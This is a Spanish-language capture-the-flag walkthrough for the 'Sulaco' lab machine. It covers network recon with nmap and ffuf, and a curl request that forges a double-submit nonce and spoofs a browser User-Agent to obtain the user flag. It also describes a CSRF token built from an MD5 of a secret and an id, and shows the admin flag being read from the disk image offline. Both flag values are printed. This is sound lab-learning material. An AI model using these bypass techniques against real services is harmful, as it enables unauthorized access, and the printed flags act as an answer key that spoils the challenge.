---
tags: [ctf, thehackerslabs, linux, walkthrough, nonce, csrf]
tipo: walkthrough
estado: resuelto
---

# Sulaco — Walkthrough

> [!note] **comando → salida relevante → interpretación → por qué**. Pasos del roadmap de Sulaco.

## Paso 1 — Diagnóstico de red

**Comando**
```bash
VBoxManage controlvm "The Hackers Labs - Sulaco" nic1 hostonly vboxnet0
# reiniciar la VM
nmap -sn 192.168.56.0/24
```

**Interpretación / por qué**
- La VM estaba en **bridged sobre wlan0**, por eso no aparecía en `192.168.56.x`. Al pasarla a **host-only** cogió `192.168.56.101` por DHCP.

## Paso 2 — Reconocimiento web

**Comando**
```bash
nmap -sV -p- 192.168.56.101
curl -s http://192.168.56.101:8080/robots.txt
ffuf -u http://192.168.56.101:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

**Salida relevante**
```text
Disallow: /api/admin_flag.php
```

**Interpretación / por qué**
- `robots.txt` revela un endpoint sensible → guía el fuzzing.

## Paso 3 — Endpoints encontrados

**Rutas**
```text
/admin                     (panel)
/api/telemetry_ua.php      (flag de usuario)
/api/admin_flag.php        (flag admin, protegida)
/ip.php
```

## Paso 4 — User flag vía telemetría (doble-submit de nonce)

**Comando**
```bash
N=$(openssl rand -hex 16)
curl -s -X POST http://192.168.56.101:8080/api/telemetry_ua.php \
  -A "Mozilla/5.0 (X11; Linux x86_64) Firefox/…" \
  -H "X-Sulaco-Nonce: $N" \
  -b "sulaco_nonce=$N"
```

**Salida relevante**
```json
{"flag":"df193336a3a7d6ab7c4e25944b797b7f","type":"user_flag"}
Set-Cookie: sulaco_user=1
```

**Interpretación / por qué**
- Requiere **UA de navegador** (curl bloqueado) y **cookie `sulaco_nonce` == header `X-Sulaco-Nonce`** (doble-submit con valor aleatorio).
- `sulaco_user=1` desbloquea `/lab/notes/`.

## Paso 5 — Escalada a admin flag

**Comando (alternativo offline, el usado)**
```bash
fls -o 2048 -r -p sulaco.raw | grep -i flag
icat -o 2048 sulaco.raw 1045959      # api/admin_flag.php
```

**Salida relevante**
```json
{"flag":"24818cc312fbd0e78e1176ef2d304680","type":"admin_flag"}
```

**Interpretación / por qué**
- La admin flag está **embebida** en `admin_flag.php`, protegida por la puerta `inc_gate.php` (`sulaco_is_unlocked()`) y por un **CSRF**: `POST id=<id>` + header `X-Flag-CSRF: md5('sulaco-secret-'.$id)`.
- Se obtuvo por **lectura offline** del disco, documentado como vía válida.

## Qué funcionó

- Partir de `robots.txt` para guiar el fuzzing.
- Reproducir el **doble-submit de nonce** y el UA de navegador.
- Lectura offline con [[Sleuthkit]].

## Qué falló (y por qué)

- `curl` con UA por defecto: bloqueado por gating.
- Acceso directo a `admin_flag.php`: puerta + CSRF.

## Qué aprendí

- Diagnóstico de red VirtualBox (bridged vs host-only).
- Autenticación por doble-submit de cookie/header.
- Gating por User-Agent y CSRF por MD5 de secreto + id.
